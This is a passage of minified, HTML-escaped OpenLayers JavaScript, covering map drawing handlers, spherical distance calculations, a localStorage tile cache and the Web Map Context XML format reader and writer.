!this.passesTolerance(this.lastDown,a.xy,this.pixelTolerance))return!0;this.touch&amp;&amp;this.modifyFeature(a.xy);this.persist&amp;&amp;this.destroyPersistedFeature();this.lastUp=a.xy;this.finalize();return!this.stopUp},mouseout:function(a){OpenLayers.Util.mouseLeft(a,this.map.viewPortDiv)&amp;&amp;(this.stoppedDown=this.stopDown,this.mouseDown=!1)},passesTolerance:function(a,b,c){var d=!0;null!=c&amp;&amp;a&amp;&amp;b&amp;&amp;a.distanceTo(b)>c&amp;&amp;(d=!1);return d},CLASS_NAME:"OpenLayers.Handler.Point"});OpenLayers.Handler.Path=OpenLayers.Class(OpenLayers.Handler.Point,{line:null,maxVertices:null,doubleTouchTolerance:20,freehand:!1,freehandToggle:"shiftKey",timerId:null,redoStack:null,createFeature:function(a){a=this.layer.getLonLatFromViewPortPx(a);a=new OpenLayers.Geometry.Point(a.lon,a.lat);this.point=new OpenLayers.Feature.Vector(a);this.line=new OpenLayers.Feature.Vector(new OpenLayers.Geometry.LineString([this.point.geometry]));this.callback("create",[this.point.geometry,this.getSketch()]); this.point.geometry.clearBounds();this.layer.addFeatures([this.line,this.point],{silent:!0})},destroyFeature:function(a){OpenLayers.Handler.Point.prototype.destroyFeature.call(this,a);this.line=null},destroyPersistedFeature:function(){var a=this.layer;a&amp;&amp;2&lt;a.features.length&amp;&amp;this.layer.features[0].destroy()},removePoint:function(){this.point&amp;&amp;this.layer.removeFeatures([this.point])},addPoint:function(a){this.layer.removeFeatures([this.point]);a=this.layer.getLonLatFromViewPortPx(a);this.point=new OpenLayers.Feature.Vector(new OpenLayers.Geometry.Point(a.lon, a.lat));this.line.geometry.addComponent(this.point.geometry,this.line.geometry.components.length);this.layer.addFeatures([this.point]);this.callback("point",[this.point.geometry,this.getGeometry()]);this.callback("modify",[this.point.geometry,this.getSketch()]);this.drawFeature();delete this.redoStack},insertXY:function(a,b){this.line.geometry.addComponent(new OpenLayers.Geometry.Point(a,b),this.getCurrentPointIndex());this.drawFeature();delete this.redoStack},insertDeltaXY:function(a,b){var c=this.getCurrentPointIndex()- 1,c=this.line.geometry.components[c];!c||(isNaN(c.x)||isNaN(c.y))||this.insertXY(c.x+a,c.y+b)},insertDirectionLength:function(a,b){a*=Math.PI/180;var c=b*Math.cos(a),d=b*Math.sin(a);this.insertDeltaXY(c,d)},insertDeflectionLength:function(a,b){var c=this.getCurrentPointIndex()-1;if(0&lt;c){var d=this.line.geometry.components[c],c=this.line.geometry.components[c-1],d=Math.atan2(d.y-c.y,d.x-c.x);this.insertDirectionLength(180*d/Math.PI+a,b)}},getCurrentPointIndex:function(){return this.line.geometry.components.length- 1},undo:function(){var a=this.line.geometry,b=a.components,c=this.getCurrentPointIndex()-1,d=b[c],e=a.removeComponent(d);e&amp;&amp;(this.touch&amp;&amp;0&lt;c&amp;&amp;(b=a.components,a=b[c-1],c=this.getCurrentPointIndex(),b=b[c],b.x=a.x,b.y=a.y),this.redoStack||(this.redoStack=[]),this.redoStack.push(d),this.drawFeature());return e},redo:function(){var a=this.redoStack&amp;&amp;this.redoStack.pop();a&amp;&amp;(this.line.geometry.addComponent(a,this.getCurrentPointIndex()),this.drawFeature());return!!a},freehandMode:function(a){return this.freehandToggle&amp;&amp; a[this.freehandToggle]?!this.freehand:this.freehand},modifyFeature:function(a,b){this.line||this.createFeature(a);var c=this.layer.getLonLatFromViewPortPx(a);this.point.geometry.x=c.lon;this.point.geometry.y=c.lat;this.callback("modify",[this.point.geometry,this.getSketch(),b]);this.point.geometry.clearBounds();this.drawFeature()},drawFeature:function(){this.layer.drawFeature(this.line,this.style);this.layer.drawFeature(this.point,this.style)},getSketch:function(){return this.line},getGeometry:function(){var a= this.line&amp;&amp;this.line.geometry;a&amp;&amp;this.multi&amp;&amp;(a=new OpenLayers.Geometry.MultiLineString([a]));return a},touchstart:function(a){if(this.timerId&amp;&amp;this.passesTolerance(this.lastTouchPx,a.xy,this.doubleTouchTolerance))return this.finishGeometry(),window.clearTimeout(this.timerId),this.timerId=null,!1;this.timerId&amp;&amp;(window.clearTimeout(this.timerId),this.timerId=null);this.timerId=window.setTimeout(OpenLayers.Function.bind(function(){this.timerId=null},this),300);return OpenLayers.Handler.Point.prototype.touchstart.call(this, a)},down:function(a){var b=this.stopDown;this.freehandMode(a)&amp;&amp;(b=!0,this.touch&amp;&amp;(this.modifyFeature(a.xy,!!this.lastUp),OpenLayers.Event.stop(a)));this.touch||this.lastDown&amp;&amp;this.passesTolerance(this.lastDown,a.xy,this.pixelTolerance)||this.modifyFeature(a.xy,!!this.lastUp);this.mouseDown=!0;this.lastDown=a.xy;this.stoppedDown=b;return!b},move:function(a){if(this.stoppedDown&amp;&amp;this.freehandMode(a))return this.persist&amp;&amp;this.destroyPersistedFeature(),this.maxVertices&amp;&amp;this.line&amp;&amp;this.line.geometry.components.length=== this.maxVertices?(this.removePoint(),this.finalize()):this.addPoint(a.xy),!1;this.touch||this.mouseDown&amp;&amp;!this.stoppedDown||this.modifyFeature(a.xy,!!this.lastUp);return!0},up:function(a){!this.mouseDown||this.lastUp&amp;&amp;this.lastUp.equals(a.xy)||(this.stoppedDown&amp;&amp;this.freehandMode(a)?(this.persist&amp;&amp;this.destroyPersistedFeature(),this.removePoint(),this.finalize()):this.passesTolerance(this.lastDown,a.xy,this.pixelTolerance)&amp;&amp;(this.touch&amp;&amp;this.modifyFeature(a.xy),null==this.lastUp&amp;&amp;this.persist&amp;&amp;this.destroyPersistedFeature(), this.addPoint(a.xy),this.lastUp=a.xy,this.line.geometry.components.length===this.maxVertices+1&amp;&amp;this.finishGeometry()));this.stoppedDown=this.stopDown;this.mouseDown=!1;return!this.stopUp},finishGeometry:function(){this.line.geometry.removeComponent(this.line.geometry.components[this.line.geometry.components.length-1]);this.removePoint();this.finalize()},dblclick:function(a){this.freehandMode(a)||this.finishGeometry();return!1},CLASS_NAME:"OpenLayers.Handler.Path"});OpenLayers.Spherical=OpenLayers.Spherical||{};OpenLayers.Spherical.DEFAULT_RADIUS=6378137;OpenLayers.Spherical.computeDistanceBetween=function(a,b,c){c=c||OpenLayers.Spherical.DEFAULT_RADIUS;var d=Math.sin(Math.PI*(b.lon-a.lon)/360),e=Math.sin(Math.PI*(b.lat-a.lat)/360);a=e*e+d*d*Math.cos(Math.PI*a.lat/180)*Math.cos(Math.PI*b.lat/180);return 2*c*Math.atan2(Math.sqrt(a),Math.sqrt(1-a))}; OpenLayers.Spherical.computeHeading=function(a,b){var c=Math.sin(Math.PI*(a.lon-b.lon)/180)*Math.cos(Math.PI*b.lat/180),d=Math.cos(Math.PI*a.lat/180)*Math.sin(Math.PI*b.lat/180)-Math.sin(Math.PI*a.lat/180)*Math.cos(Math.PI*b.lat/180)*Math.cos(Math.PI*(a.lon-b.lon)/180);return 180*Math.atan2(c,d)/Math.PI};OpenLayers.Control.CacheWrite=OpenLayers.Class(OpenLayers.Control,{layers:null,imageFormat:"image/png",quotaRegEx:/quota/i,setMap:function(a){OpenLayers.Control.prototype.setMap.apply(this,arguments);var b,c=this.layers||a.layers;for(b=c.length-1;0&lt;=b;--b)this.addLayer({layer:c[b]});if(!this.layers)a.events.on({addlayer:this.addLayer,removeLayer:this.removeLayer,scope:this})},addLayer:function(a){a.layer.events.on({tileloadstart:this.makeSameOrigin,tileloaded:this.onTileLoaded,scope:this})},removeLayer:function(a){a.layer.events.un({tileloadstart:this.makeSameOrigin, tileloaded:this.onTileLoaded,scope:this})},makeSameOrigin:function(a){if(this.active&amp;&amp;(a=a.tile,a instanceof OpenLayers.Tile.Image&amp;&amp;!a.crossOriginKeyword&amp;&amp;"data:"!==a.url.substr(0,5))){var b=OpenLayers.Request.makeSameOrigin(a.url,OpenLayers.ProxyHost);OpenLayers.Control.CacheWrite.urlMap[b]=a.url;a.url=b}},onTileLoaded:function(a){this.active&amp;&amp;(!a.aborted&amp;&amp;a.tile instanceof OpenLayers.Tile.Image&amp;&amp;"data:"!==a.tile.url.substr(0,5))&amp;&amp;(this.cache({tile:a.tile}),delete OpenLayers.Control.CacheWrite.urlMap[a.tile.url])}, cache:function(a){if(window.localStorage){a=a.tile;try{var b=a.getCanvasContext();b&amp;&amp;window.localStorage.setItem("olCache_"+(OpenLayers.Control.CacheWrite.urlMap[a.url]||a.url),b.canvas.toDataURL(this.imageFormat))}catch(c){(b=c.name||c.message)&amp;&amp;this.quotaRegEx.test(b)?this.events.triggerEvent("cachefull",{tile:a}):OpenLayers.Console.error(c.toString())}}},destroy:function(){if(this.layers||this.map){var a,b=this.layers||this.map.layers;for(a=b.length-1;0&lt;=a;--a)this.removeLayer({layer:b[a]})}this.map&amp;&amp; this.map.events.un({addlayer:this.addLayer,removeLayer:this.removeLayer,scope:this});OpenLayers.Control.prototype.destroy.apply(this,arguments)},CLASS_NAME:"OpenLayers.Control.CacheWrite"});OpenLayers.Control.CacheWrite.clearCache=function(){if(window.localStorage){var a,b;for(a=window.localStorage.length-1;0&lt;=a;--a)b=window.localStorage.key(a),"olCache_"===b.substr(0,8)&amp;&amp;window.localStorage.removeItem(b)}};OpenLayers.Control.CacheWrite.urlMap={};OpenLayers.Format.Context=OpenLayers.Class(OpenLayers.Format.XML.VersionedOGC,{layerOptions:null,layerParams:null,read:function(a,b){var c=OpenLayers.Format.XML.VersionedOGC.prototype.read.apply(this,arguments);if(b&amp;&amp;b.map)if(this.context=c,b.map instanceof OpenLayers.Map)c=this.mergeContextToMap(c,b.map);else{var d=b.map;if(OpenLayers.Util.isElement(d)||"string"==typeof d)d={div:d};c=this.contextToMap(c,d)}return c},getLayerFromContext:function(a){var b,c,d={queryable:a.queryable,visibility:a.visibility, maxExtent:a.maxExtent,metadata:OpenLayers.Util.applyDefaults(a.metadata,{styles:a.styles,formats:a.formats,"abstract":a["abstract"],dataURL:a.dataURL}),numZoomLevels:a.numZoomLevels,units:a.units,isBaseLayer:a.isBaseLayer,opacity:a.opacity,displayInLayerSwitcher:a.displayInLayerSwitcher,singleTile:a.singleTile,tileSize:a.tileSize?new OpenLayers.Size(a.tileSize.width,a.tileSize.height):void 0,minScale:a.minScale||a.maxScaleDenominator,maxScale:a.maxScale||a.minScaleDenominator,srs:a.srs,dimensions:a.dimensions, metadataURL:a.metadataURL};this.layerOptions&amp;&amp;OpenLayers.Util.applyDefaults(d,this.layerOptions);var e={layers:a.name,transparent:a.transparent,version:a.version};if(a.formats&amp;&amp;0&lt;a.formats.length)for(e.format=a.formats[0].value,b=0,c=a.formats.length;b&lt;c;b++){var f=a.formats[b];if(!0==f.current){e.format=f.value;break}}if(a.styles&amp;&amp;0&lt;a.styles.length)for(b=0,c=a.styles.length;b&lt;c;b++)if(f=a.styles[b],!0==f.current){f.href?e.sld=f.href:f.body?e.sld_body=f.body:e.styles=f.name;break}this.layerParams&amp;&amp; OpenLayers.Util.applyDefaults(e,this.layerParams);b=null;c=a.service;c==OpenLayers.Format.Context.serviceTypes.WFS?(d.strategies=[new OpenLayers.Strategy.BBOX],d.protocol=new OpenLayers.Protocol.WFS({url:a.url,featurePrefix:a.name.split(":")[0],featureType:a.name.split(":").pop()}),b=new OpenLayers.Layer.Vector(a.title||a.name,d)):c==OpenLayers.Format.Context.serviceTypes.KML?(d.strategies=[new OpenLayers.Strategy.Fixed],d.protocol=new OpenLayers.Protocol.HTTP({url:a.url,format:new OpenLayers.Format.KML}), b=new OpenLayers.Layer.Vector(a.title||a.name,d)):c==OpenLayers.Format.Context.serviceTypes.GML?(d.strategies=[new OpenLayers.Strategy.Fixed],d.protocol=new OpenLayers.Protocol.HTTP({url:a.url,format:new OpenLayers.Format.GML}),b=new OpenLayers.Layer.Vector(a.title||a.name,d)):a.features?(b=new OpenLayers.Layer.Vector(a.title||a.name,d),b.addFeatures(a.features)):!0!==a.categoryLayer&amp;&amp;(b=new OpenLayers.Layer.WMS(a.title||a.name,a.url,e,d));return b},getLayersFromContext:function(a){for(var b=[],c= 0,d=a.length;c&lt;d;c++){var e=this.getLayerFromContext(a[c]);null!==e&amp;&amp;b.push(e)}return b},contextToMap:function(a,b){b=OpenLayers.Util.applyDefaults({maxExtent:a.maxExtent,projection:a.projection,units:a.units},b);b.maxExtent&amp;&amp;(b.maxResolution=b.maxExtent.getWidth()/OpenLayers.Map.TILE_WIDTH);b.metadata={contactInformation:a.contactInformation,"abstract":a["abstract"],keywords:a.keywords,logo:a.logo,descriptionURL:a.descriptionURL};var c=new OpenLayers.Map(b);c.addLayers(this.getLayersFromContext(a.layersContext)); c.setCenter(a.bounds.getCenterLonLat(),c.getZoomForExtent(a.bounds,!0));return c},mergeContextToMap:function(a,b){b.addLayers(this.getLayersFromContext(a.layersContext));return b},write:function(a,b){a=this.toContext(a);return OpenLayers.Format.XML.VersionedOGC.prototype.write.apply(this,arguments)},CLASS_NAME:"OpenLayers.Format.Context"}); OpenLayers.Format.Context.serviceTypes={WMS:"urn:ogc:serviceType:WMS",WFS:"urn:ogc:serviceType:WFS",WCS:"urn:ogc:serviceType:WCS",GML:"urn:ogc:serviceType:GML",SLD:"urn:ogc:serviceType:SLD",FES:"urn:ogc:serviceType:FES",KML:"urn:ogc:serviceType:KML"};OpenLayers.Format.WMC=OpenLayers.Class(OpenLayers.Format.Context,{defaultVersion:"1.1.0",layerToContext:function(a){var b=this.getParser(),c={queryable:a.queryable,visibility:a.visibility,name:a.params.LAYERS,title:a.name,"abstract":a.metadata["abstract"],dataURL:a.metadata.dataURL,metadataURL:a.metadataURL,server:{version:a.params.VERSION,url:a.url},maxExtent:a.maxExtent,transparent:a.params.TRANSPARENT,numZoomLevels:a.numZoomLevels,units:a.units,isBaseLayer:a.isBaseLayer,opacity:1==a.opacity?void 0: a.opacity,displayInLayerSwitcher:a.displayInLayerSwitcher,singleTile:a.singleTile,tileSize:a.singleTile||!a.tileSize?void 0:{width:a.tileSize.w,height:a.tileSize.h},minScale:a.options.resolutions||a.options.scales||a.options.maxResolution||a.options.minScale?a.minScale:void 0,maxScale:a.options.resolutions||a.options.scales||a.options.minResolution||a.options.maxScale?a.maxScale:void 0,formats:[],styles:[],srs:a.srs,dimensions:a.dimensions};a.metadata.servertitle&amp;&amp;(c.server.title=a.metadata.servertitle); if(a.metadata.formats&amp;&amp;0&lt;a.metadata.formats.length)for(var d=0,e=a.metadata.formats.length;d&lt;e;d++){var f=a.metadata.formats[d];c.formats.push({value:f.value,current:f.value==a.params.FORMAT})}else c.formats.push({value:a.params.FORMAT,current:!0});if(a.metadata.styles&amp;&amp;0&lt;a.metadata.styles.length)for(d=0,e=a.metadata.styles.length;d&lt;e;d++)b=a.metadata.styles[d],b.current=b.href==a.params.SLD||b.body==a.params.SLD_BODY||b.name==a.params.STYLES?!0:!1,c.styles.push(b);else c.styles.push({href:a.params.SLD, body:a.params.SLD_BODY,name:a.params.STYLES||b.defaultStyleName,title:b.defaultStyleTitle,current:!0});return c},toContext:function(a){var b={},c=a.layers;if("OpenLayers.Map"==a.CLASS_NAME){var d=a.metadata||{};b.size=a.getSize();b.bounds=a.getExtent();b.projection=a.projection;b.title=a.title;b.keywords=d.keywords;b["abstract"]=d["abstract"];b.logo=d.logo;b.descriptionURL=d.descriptionURL;b.contactInformation=d.contactInformation;b.maxExtent=a.maxExtent}else OpenLayers.Util.applyDefaults(b,a),void 0!= b.layers&amp;&amp;delete b.layers;void 0==b.layersContext&amp;&amp;(b.layersContext=[]);if(void 0!=c&amp;&amp;OpenLayers.Util.isArray(c))for(a=0,d=c.length;a&lt;d;a++){var e=c[a];e instanceof OpenLayers.Layer.WMS&amp;&amp;b.layersContext.push(this.layerToContext(e))}return b},CLASS_NAME:"OpenLayers.Format.WMC"});OpenLayers.Format.WMC.v1=OpenLayers.Class(OpenLayers.Format.XML,{namespaces:{ol:"http://openlayers.org/context",wmc:"http://www.opengis.net/context",sld:"http://www.opengis.net/sld",xlink:"http://www.w3.org/1999/xlink",xsi:"http://www.w3.org/2001/XMLSchema-instance"},schemaLocation:"",getNamespacePrefix:function(a){var b=null;if(null==a)b=this.namespaces[this.defaultPrefix];else for(b in this.namespaces)if(this.namespaces[b]==a)break;return b},defaultPrefix:"wmc",rootPrefix:null,defaultStyleName:"", defaultStyleTitle:"Default",initialize:function(a){OpenLayers.Format.XML.prototype.initialize.apply(this,[a])},read:function(a){"string"==typeof a&amp;&amp;(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]));a=a.documentElement;this.rootPrefix=a.prefix;var b={version:a.getAttribute("version")};this.runChildNodes(b,a);return b},runChildNodes:function(a,b){for(var c=b.childNodes,d,e,f,g=0,h=c.length;g&lt;h;++g)d=c[g],1==d.nodeType&amp;&amp;(e=this.getNamespacePrefix(d.namespaceURI),f=d.nodeName.split(":").pop(), (e=this["read_"+e+"_"+f])&amp;&amp;e.apply(this,[a,d]))},read_wmc_General:function(a,b){this.runChildNodes(a,b)},read_wmc_BoundingBox:function(a,b){a.projection=b.getAttribute("SRS");a.bounds=new OpenLayers.Bounds(b.getAttribute("minx"),b.getAttribute("miny"),b.getAttribute("maxx"),b.getAttribute("maxy"))},read_wmc_LayerList:function(a,b){a.layersContext=[];this.runChildNodes(a,b)},read_wmc_Layer:function(a,b){var c={visibility:"1"!=b.getAttribute("hidden"),queryable:"1"==b.getAttribute("queryable"),formats:[], styles:[],metadata:{}};this.runChildNodes(c,b);a.layersContext.push(c)},read_wmc_Extension:function(a,b){this.runChildNodes(a,b)},read_ol_units:function(a,b){a.units=this.getChildValue(b)},read_ol_maxExtent:function(a,b){var c=new OpenLayers.Bounds(b.getAttribute("minx"),b.getAttribute("miny"),b.getAttribute("maxx"),b.getAttribute("maxy"));a.maxExtent=c},read_ol_transparent:function(a,b){a.transparent=this.getChildValue(b)},read_ol_numZoomLevels:function(a,b){a.numZoomLevels=parseInt(this.getChildValue(b))}, read_ol_opacity:function(a,b){a.opacity=parseFloat(this.getChildValue(b))},read_ol_singleTile:function(a,b){a.singleTile="true"==this.getChildValue(b)},read_ol_tileSize:function(a,b){var c={width:b.getAttribute("width"),height:b.getAttribute("height")};a.tileSize=c},read_ol_isBaseLayer:function(a,b){a.isBaseLayer="true"==this.getChildValue(b)},read_ol_displayInLayerSwitcher:function(a,b){a.displayInLayerSwitcher="true"==this.getChildValue(b)},read_wmc_Server:function(a,b){a.version=b.getAttribute("version"); a.url=this.getOnlineResource_href(b);a.metadata.servertitle=b.getAttribute("title")},read_wmc_FormatList:function(a,b){this.runChildNodes(a,b)},read_wmc_Format:function(a,b){var c={value:this.getChildValue(b)};"1"==b.getAttribute("current")&amp;&amp;(c.current=!0);a.formats.push(c)},read_wmc_StyleList:function(a,b){this.runChildNodes(a,b)},read_wmc_Style:function(a,b){var c={};this.runChildNodes(c,b);"1"==b.getAttribute("current")&amp;&amp;(c.current=!0);a.styles.push(c)},read_wmc_SLD:function(a,b){this.runChildNodes(a, b)},read_sld_StyledLayerDescriptor:function(a,b){var c=OpenLayers.Format.XML.prototype.write.apply(this,[b]);a.body=c},read_sld_FeatureTypeStyle:function(a,b){var c=OpenLayers.Format.XML.prototype.write.apply(this,[b]);a.body=c},read_wmc_OnlineResource:function(a,b){a.href=this.getAttributeNS(b,this.namespaces.xlink,"href")},read_wmc_Name:function(a,b){var c=this.getChildValue(b);c&amp;&amp;(a.name=c)},read_wmc_Title:function(a,b){var c=this.getChildValue(b);c&amp;&amp;(a.title=c)},read_wmc_MetadataURL:function(a, b){a.metadataURL=this.getOnlineResource_href(b)},read_wmc_KeywordList:function(a,b){a.keywords=[];this.runChildNodes(a.keywords,b)},read_wmc_Keyword:function(a,b){a.push(this.getChildValue(b))},read_wmc_Abstract:function(a,b){var c=this.getChildValue(b);c&amp;&amp;(a["abstract"]=c)},read_wmc_LogoURL:function(a,b){a.logo={width:b.getAttribute("width"),height:b.getAttribute("height"),format:b.getAttribute("format"),href:this.getOnlineResource_href(b)}},read_wmc_DescriptionURL:function(a,b){a.descriptionURL= this.getOnlineResource_href(b)},read_wmc_ContactInformation:function(a,b){var c={};this.runChildNodes(c,b);a.contactInformation=c},read_wmc_ContactPersonPrimary:function(a,b){var c={};this.runChildNodes(c,b);a.personPrimary=c},read_wmc_ContactPerson:function(a,b){var c=this.getChildValue(b);c&amp;&amp;(a.person=c)},read_wmc_ContactOrganization:function(a,b){var c=this.getChildValue(b);c&amp;&amp;(a.organization=c)},read_wmc_ContactPosition:function(a,b){var c=this.getChildValue(b);c&amp;&amp;(a.position=c)},read_wmc_ContactAddress:function(a, b){var c={};this.runChildNodes(c,b);a.contactAddress=c},read_wmc_AddressType:function(a,b){var c=this.getChildValue(b);c&amp;&amp;(a.type=c)},read_wmc_Address:function(a,b){var c=this.getChildValue(b);c&amp;&amp;(a.address=c)},read_wmc_City:function(a,b){var c=this.getChildValue(b);c&amp;&amp;(a.city=c)},read_wmc_StateOrProvince:function(a,b){var c=this.getChildValue(b);c&amp;&amp;(a.stateOrProvince=c)},read_wmc_PostCode:function(a,b){var c=this.getChildValue(b);c&amp;&amp;(a.postcode=c)},read_wmc_Country:function(a,b){var c=this.getChildValue(b); c&amp;&amp;(a.country=c)},read_wmc_ContactVoiceTelephone:function(a,b){var c=this.getChildValue(b);c&amp;&amp;(a.phone=c)},read_wmc_ContactFacsimileTelephone:function(a,b){var c=this.getChildValue(b);c&amp;&amp;(a.fax=c)},read_wmc_ContactElectronicMailAddress:function(a,b){var c=this.getChildValue(b);c&amp;&amp;(a.email=c)},read_wmc_DataURL:function(a,b){a.dataURL=this.getOnlineResource_href(b)},read_wmc_LegendURL:function(a,b){var c={width:b.getAttribute("width"),height:b.getAttribute("height"),format:b.getAttribute("format"), href:this.getOnlineResource_href(b)};a.legend=c},read_wmc_DimensionList:function(a,b){a.dimensions={};this.runChildNodes(a.dimensions,b)},read_wmc_Dimension:function(a,b){var c={name:b.getAttribute("name").toLowerCase(),units:b.getAttribute("units")||"",unitSymbol:b.getAttribute("unitSymbol")||"",userValue:b.getAttribute("userValue")||"",nearestValue:"1"===b.getAttribute("nearestValue"),multipleValues:"1"===b.getAttribute("multipleValues"),current:"1"===b.getAttribute("current"),"default":b.getAttribute("default")|| ""},d=this.getChildValue(b);c.values=d.split(",");a[c.name]=c},write:function(a,b){var c=this.createElementDefaultNS("ViewContext");this.setAttributes(c,{version:this.VERSION,id:b&amp;&amp;"string"==typeof b.id?b.id:OpenLayers.Util.createUniqueID("OpenLayers_Context_")});this.setAttributeNS(c,this.namespaces.xsi,"xsi:schemaLocation",this.schemaLocation);c.appendChild(this.write_wmc_General(a));c.appendChild(this.write_wmc_LayerList(a));return OpenLayers.Format.XML.prototype.write.apply(this,[c])},createElementDefaultNS:function(a, b,c){a=this.createElementNS(this.namespaces[this.defaultPrefix],a);b&amp;&amp;a.appendChild(this.createTextNode(b));c&amp;&amp;this.setAttributes(a,c);return a},setAttributes:function(a,b){var c,d;for(d in b)c=b[d].toString(),c.match(/[A-Z]/)?this.setAttributeNS(a,null,d,c):a.setAttribute(d,c)},write_wmc_General:function(a){var b=this.createElementDefaultNS("General");a.size&amp;&amp;b.appendChild(this.createElementDefaultNS("Window",null,{width:a.size.w,height:a.size.h}));var c=a.bounds;b.appendChild(this.createElementDefaultNS("BoundingBox", null,{minx:c.left.toPrecision(18),miny:c.bottom.toPrecision(18),maxx:c.right.toPrecision(18),maxy:c.top.toPrecision(18),SRS:a.projection}));b.appendChild(this.createElementDefaultNS("Title",a.title));a.keywords&amp;&amp;b.appendChild(this.write_wmc_KeywordList(a.keywords));a["abstract"]&amp;&amp;b.appendChild(this.createElementDefaultNS("Abstract",a["abstract"]));a.logo&amp;&amp;b.appendChild(this.write_wmc_URLType("LogoURL",a.logo.href,a.logo));a.descriptionURL&amp;&amp;b.appendChild(this.write_wmc_URLType("DescriptionURL",a.descriptionURL)); a.contactInformation&amp;&amp;b.appendChild(this.write_wmc_ContactInformation(a.contactInformation));b.appendChild(this.write_ol_MapExtension(a));return b},write_wmc_KeywordList:function(a){for(var b=this.createElementDefaultNS("KeywordList"),c=0,d=a.length;c&lt;d;c++)b.appendChild(this.createElementDefaultNS("Keyword",a[c]));return b},write_wmc_ContactInformation:function(a){var b=this.createElementDefaultNS("ContactInformation");a.personPrimary&amp;&amp;b.appendChild(this.write_wmc_ContactPersonPrimary(a.personPrimary)); a.position&amp;&amp;b.appendChild(this.createElementDefaultNS("ContactPosition",a.position));a.contactAddress&amp;&amp;b.appendChild(this.write_wmc_ContactAddress(a.contactAddress));a.phone&amp;&amp;b.appendChild(this.createElementDefaultNS("ContactVoiceTelephone",a.phone));a.fax&amp;&amp;b.appendChild(this.createElementDefaultNS("ContactFacsimileTelephone",a.fax));a.email&amp;&amp;b.appendChild(this.createElementDefaultNS("ContactElectronicMailAddress",a.email));return b},write_wmc_ContactPersonPrimary:function(a){var b=this.createElementDefaultNS("ContactPersonPrimary"); a.person&amp;&amp;b.appendChild(this.createElementDefaultNS("ContactPerson",a.person));a.organization&amp;&amp;b.appendChild(this.createElementDefaultNS("ContactOrganization",a.organization));return b},write_wmc_ContactAddress:function(a){var b=this.createElementDefaultNS("ContactAddress");a.type&amp;&amp;b.appendChild(this.createElementDefaultNS("AddressType",a.type));a.address&amp;&amp;b.appendChild(this.createElementDefaultNS("Address",a.address));a.city&amp;&amp;b.appendChild(this.createElementDefaultNS("City",a.city));a.stateOrProvince&amp;&amp; b.appendChild(this.createElementDefaultNS("StateOrProvince",a.stateOrProvince));a.postcode&amp;&amp;b.appendChild(this.createElementDefaultNS("PostCode",a.postcode));a.country&amp;&amp;b.appendChild(this.createElementDefaultNS("Country",a.country));return b},write_ol_MapExtension:function(a){var b=this.createElementDefaultNS("Extension");if(a=a.maxExtent){var c=this.createElementNS(this.namespaces.ol,"ol:maxExtent");this.setAttributes(c,{minx:a.left.toPrecision(18),miny:a.bottom.toPrecision(18),maxx:a.right.toPrecision(18), maxy:a.top.toPrecision(18)});b.appendChild(c)}return b},write_wmc_LayerList:function(a){for(var b=this.createElementDefaultNS("LayerList"),c=0,d=a.layersContext.length;c&lt;d;++c)b.appendChild(this.write_wmc_Layer(a.layersContext[c]));return b},write_wmc_Layer:function(a){var b=this.createElementDefaultNS("Layer",null,{queryable:a.queryable?"1":"0",hidden:a.visibility?"0":"1"});b.appendChild(this.write_wmc_Server(a));b.appendChild(this.createElementDefaultNS("Name",a.name));b.appendChild(this.createElementDefaultNS("Title", a.title));a["abstract"]&amp;&amp;b.appendChild(this.createElementDefaultNS("Abstract",a["abstract"]));a.dataURL&amp;&amp;b.appendChild(this.write_wmc_URLType("DataURL",a.dataURL));a.metadataURL&amp;&amp;b.appendChild(this.write_wmc_URLType("MetadataURL",a.metadataURL));return b},write_wmc_LayerExtension:function(a){var b=this.createElementDefaultNS("Extension"),c=a.maxExtent,d=this.createElementNS(this.namespaces.ol,"ol:maxExtent");this.setAttributes(d,{minx:c.left.toPrecision(18),miny:c.bottom.toPrecision(18),maxx:c.right.toPrecision(18), maxy:c.top.toPrecision(18)});b.appendChild(d);a.tileSize&amp;&amp;!a.singleTile&amp;&amp;(c=this.createElementNS(this.namespaces.ol,"ol:tileSize"),this.setAttributes(c,a.tileSize),b.appendChild(c));for(var c="transparent numZoomLevels units isBaseLayer opacity displayInLayerSwitcher singleTile".split(" "),e=0,f=c.length;e&lt;f;++e)(d=this.createOLPropertyNode(a,c[e]))&amp;&amp;b.appendChild(d);return b},createOLPropertyNode:function(a,b){var c=null;null!=a[b]&amp;&amp;(c=this.createElementNS(this.namespaces.ol,"ol:"+b),c.appendChild(this.createTextNode(a[b].toString()))); return c},write_wmc_Server:function(a){a=a.server;var b=this.createElementDefaultNS("Server"),c={service:"OGC:WMS",version:a.version};a.title&amp;&amp;(c.title=a.title);this.setAttributes(b,c);b.appendChild(this.write_wmc_OnlineResource(a.url));return b},write_wmc_URLType:function(a,b,c){a=this.createElementDefaultNS(a);a.appendChild(this.write_wmc_OnlineResource(b));if(c){b=["width","height","format"];for(var d=0;d&lt;b.length;d++)b[d]in c&amp;&amp;a.setAttribute(b[d],c[b[d]])}return a},write_wmc_DimensionList:function(a){var b= this.createElementDefaultNS("DimensionList"),c;for(c in a.dimensions){var d={},e=a.dimensions[c],f;for(f in e)d[f]="boolean"==typeof e[f]?Number(e[f]):e[f];e="";d.values&amp;&amp;(e=d.values.join(","),delete d.values);b.appendChild(this.createElementDefaultNS("Dimension",e,d))}return b},write_wmc_FormatList:function(a){for(var b=this.createElementDefaultNS("FormatList"),c=0,d=a.formats.length;c&lt;d;c++){var e=a.formats[c];b.appendChild(this.createElementDefaultNS("Format",e.value,e.current&amp;&amp;!0==e.current?{current:"1"}: null))}return b},write_wmc_StyleList:function(a){var b=this.createElementDefaultNS("StyleList");if((a=a.styles)&amp;&amp;OpenLayers.Util.isArray(a))for(var c,d=0,e=a.length;d&lt;e;d++){var f=a[d],g=this.createElementDefaultNS("Style",null,f.current&amp;&amp;!0==f.current?{current:"1"}:null);f.href?(c=this.createElementDefaultNS("SLD"),f.name&amp;&amp;c.appendChild(this.createElementDefaultNS("Name",f.name)),f.title&amp;&amp;c.appendChild(this.createElementDefaultNS("Title",f.title)),f.legend&amp;&amp;c.appendChild(this.write_wmc_URLType("LegendURL", 